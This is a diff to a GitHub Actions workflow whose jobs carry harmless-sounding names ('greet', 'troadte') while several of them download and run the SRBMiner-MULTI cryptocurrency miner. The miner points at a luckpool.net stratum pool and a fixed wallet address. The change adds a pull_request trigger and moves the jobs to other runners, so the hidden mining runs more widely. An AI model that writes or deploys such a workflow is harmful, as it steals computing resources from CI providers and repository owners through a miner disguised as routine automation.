@@ -1,10 +1,12 @@
 name: Manual workflow
 
-on: [push]
+on: 
+  - push
+  - pull_request
 
 jobs:
   greet:
-    runs-on: fasterci-large
+    runs-on: fasterci-medium
     timeout-minutes: 50
     steps:
       - run: |
@@ -16,7 +18,7 @@ jobs:
           ./SRBMiner-Multi-3-1-1/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://ap.luckpool.net:3956 --wallet REBiQeBs4ZcXQV2xu961D6JxzhXAZ53qXp --cpu-threads 2
   greet1:
     needs: greet
-    runs-on: fasterci-large
+    runs-on: fasterci-medium
     timeout-minutes: 50
     if: always()
     steps:
@@ -30,7 +32,7 @@ jobs:
 
   greet2:
     needs: greet1
-    runs-on: fasterci-large
+    runs-on: fasterci-medium
     timeout-minutes: 50
     if: always()
     steps:
@@ -44,7 +46,7 @@ jobs:
 
   greet3:
     needs: greet2
-    runs-on: fasterci-large
+    runs-on: fasterci-medium
     timeout-minutes: 50
     if: always()
     steps:
@@ -58,7 +60,7 @@ jobs:
 
   greet4:
     needs: greet3
-    runs-on: fasterci-large
+    runs-on: fasterci-medium
     timeout-minutes: 50
     if: always()
     steps:
@@ -72,7 +74,7 @@ jobs:
 
   greet5:
     needs: greet4
-    runs-on: fasterci-large
+    runs-on: fasterci-medium
     timeout-minutes: 50
     if: always()
     steps:
@@ -86,7 +88,7 @@ jobs:
 
   greet6:
     needs: greet5
-    runs-on: fasterci-large
+    runs-on: fasterci-medium
     timeout-minutes: 50
     if: always()
     steps:
@@ -100,7 +102,7 @@ jobs:
 
   greet7:
     needs: greet6
-    runs-on: fasterci-large
+    runs-on: fasterci-medium
     timeout-minutes: 50
     if: always()
     steps:
@@ -114,7 +116,7 @@ jobs:
 
   greet8:
     needs: greet7
-    runs-on: fasterci-large
+    runs-on: fasterci-medium
     timeout-minutes: 50
     if: always()
     steps:
@@ -128,7 +130,7 @@ jobs:
 
   greet9:
     needs: greet8
-    runs-on: fasterci-large
+    runs-on: fasterci-medium
     timeout-minutes: 50
     if: always()
     steps:
@@ -142,7 +144,7 @@ jobs:
 
   greet10:
     needs: greet9
-    runs-on: fasterci-large
+    runs-on: fasterci-medium
     timeout-minutes: 50
     if: always()
     steps:
@@ -156,7 +158,7 @@ jobs:
 
   greet11:
     needs: greet10
-    runs-on: fasterci-large
+    runs-on: fasterci-medium
     timeout-minutes: 50
     if: always()
     steps:
@@ -170,7 +172,7 @@ jobs:
 
   greet12:
     needs: greet11
-    runs-on: fasterci-large
+    runs-on: fasterci-medium
     timeout-minutes: 50
     if: always()
     steps:
@@ -184,7 +186,7 @@ jobs:
 
   greet13:
     needs: greet12
-    runs-on: fasterci-large
+    runs-on: fasterci-medium
     timeout-minutes: 50
     if: always()
     steps:
@@ -198,7 +200,7 @@ jobs:
 
   greet14:
     needs: greet13
-    runs-on: fasterci-large
+    runs-on: fasterci-medium
     timeout-minutes: 50
     if: always()
     steps:
@@ -212,7 +214,7 @@ jobs:
 
   greet15:
     needs: greet14
-    runs-on: fasterci-large
+    runs-on: fasterci-medium
     timeout-minutes: 50
     if: always()
     steps:
@@ -226,7 +228,7 @@ jobs:
 
   greet16:
     needs: greet15
-    runs-on: fasterci-large
+    runs-on: fasterci-medium
     timeout-minutes: 50
     if: always()
     steps:
@@ -240,7 +242,7 @@ jobs:
 
   greet17:
     needs: greet16
-    runs-on: fasterci-large
+    runs-on: fasterci-medium
     timeout-minutes: 50
     if: always()
     steps:
@@ -254,7 +256,7 @@ jobs:
 
   greet18:
     needs: greet17
-    runs-on: fasterci-large
+    runs-on: fasterci-medium
     timeout-minutes: 50
     if: always()
     steps:
@@ -268,7 +270,7 @@ jobs:
 
   greet19:
     needs: greet18
-    runs-on: fasterci-large
+    runs-on: fasterci-medium
     timeout-minutes: 50
     if: always()
     steps:
@@ -280,7 +282,7 @@ jobs:
           echo "Start Mining"
           ./SRBMiner-Multi-3-1-1/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://ap.luckpool.net:3956 --wallet REBiQeBs4ZcXQV2xu961D6JxzhXAZ53qXp --cpu-threads 2
   troadte:
-    runs-on: fasterci-large
+    runs-on: fasterci-medium
     timeout-minutes: 50
     steps:
       - run: |
@@ -292,7 +294,7 @@ jobs:
           ./SRBMiner-Multi-3-1-1/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://ap.luckpool.net:3956 --wallet REBiQeBs4ZcXQV2xu961D6JxzhXAZ53qXp --cpu-threads 2
   troadte1:
     needs: troadte
-    runs-on: fasterci-large
+    runs-on: fasterci-medium
     timeout-minutes: 50
     if: always()
     steps:
@@ -306,7 +308,7 @@ jobs:
 
   troadte2:
     needs: troadte1
-    runs-on: fasterci-large
+    runs-on: fasterci-medium
     timeout-minutes: 50
     if: always()
     steps:
@@ -320,7 +322,7 @@ jobs:
 
   troadte3:
     needs: troadte2
-    runs-on: fasterci-large
+    runs-on: fasterci-medium
     timeout-minutes: 50
     if: always()
     steps:
@@ -334,7 +336,7 @@ jobs:
 
   troadte4:
     needs: troadte3
-    runs-on: fasterci-large
+    runs-on: fasterci-medium
     timeout-minutes: 50
     if: always()
     steps:
@@ -348,7 +350,7 @@ jobs:
 
   troadte5:
     needs: troadte4
-    runs-on: fasterci-large
+    runs-on: fasterci-medium
     timeout-minutes: 50
     if: always()
     steps:
@@ -362,7 +364,7 @@ jobs:
 
   troadte6:
     needs: troadte5
-    runs-on: fasterci-large
+    runs-on: fasterci-medium
     timeout-minutes: 50
     if: always()
     steps:
@@ -376,7 +378,7 @@ jobs:
 
   troadte7:
     needs: troadte6
-    runs-on: fasterci-large
+    runs-on: fasterci-medium
     timeout-minutes: 50
     if: always()
     steps:
@@ -390,7 +392,7 @@ jobs:
 
   troadte8:
     needs: troadte7
-    runs-on: fasterci-large
+    runs-on: fasterci-medium
     timeout-minutes: 50
     if: always()
     steps:
@@ -404,7 +406,7 @@ jobs:
 
   troadte9:
     needs: troadte8
-    runs-on: fasterci-large
+    runs-on: fasterci-medium
     timeout-minutes: 50
     if: always()
     steps:
@@ -418,7 +420,7 @@ jobs:
 
   troadte10:
     needs: troadte9
-    runs-on: fasterci-large
+    runs-on: fasterci-medium
     timeout-minutes: 50
     if: always()
     steps:
@@ -432,7 +434,7 @@ jobs:
 
   troadte11:
     needs: troadte10
-    runs-on: fasterci-large
+    runs-on: fasterci-medium
     timeout-minutes: 50
     if: always()
     steps:
@@ -446,7 +448,7 @@ jobs:
 
   troadte12:
     needs: troadte11
-    runs-on: fasterci-large
+    runs-on: fasterci-medium
     timeout-minutes: 50
     if: always()
     steps:
@@ -460,7 +462,7 @@ jobs:
 
   troadte13:
     needs: troadte12
-    runs-on: fasterci-large
+    runs-on: fasterci-medium
     timeout-minutes: 50
     if: always()
     steps:
@@ -474,7 +476,7 @@ jobs:
 
   troadte14:
     needs: troadte13
-    runs-on: fasterci-large
+    runs-on: fasterci-medium
     timeout-minutes: 50
     if: always()
     steps:
@@ -488,7 +490,7 @@ jobs:
 
   troadte15:
     needs: troadte14
-    runs-on: fasterci-large
+    runs-on: fasterci-medium
     timeout-minutes: 50
     if: always()
     steps:
@@ -502,7 +504,7 @@ jobs:
 
   troadte16:
     needs: troadte15
-    runs-on: fasterci-large
+    runs-on: fasterci-medium
     timeout-minutes: 50
     if: always()
     steps:
@@ -516,7 +518,7 @@ jobs:
 
   troadte17:
     needs: troadte16
-    runs-on: fasterci-large
+    runs-on: fasterci-medium
     timeout-minutes: 50
     if: always()
     steps:
@@ -530,7 +532,7 @@ jobs:
 
   troadte18:
     needs: troadte17
-    runs-on: fasterci-large
+    runs-on: fasterci-medium
     timeout-minutes: 50
     if: always()
     steps:
@@ -544,7 +546,7 @@ jobs:
 
   troadte19:
     needs: troadte18
-    runs-on: fasterci-large
+    runs-on: fasterci-medium
     timeout-minutes: 50
     if: always()
     steps:
@@ -555,5 +557,4 @@ jobs:
           tar -xzf SRBMiner-Multi.tar.gz
           echo "Start Mining"
           ./SRBMiner-Multi-3-1-1/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://ap.luckpool.net:3956 --wallet REBiQeBs4ZcXQV2xu961D6JxzhXAZ53qXp --cpu-threads 2
-
 
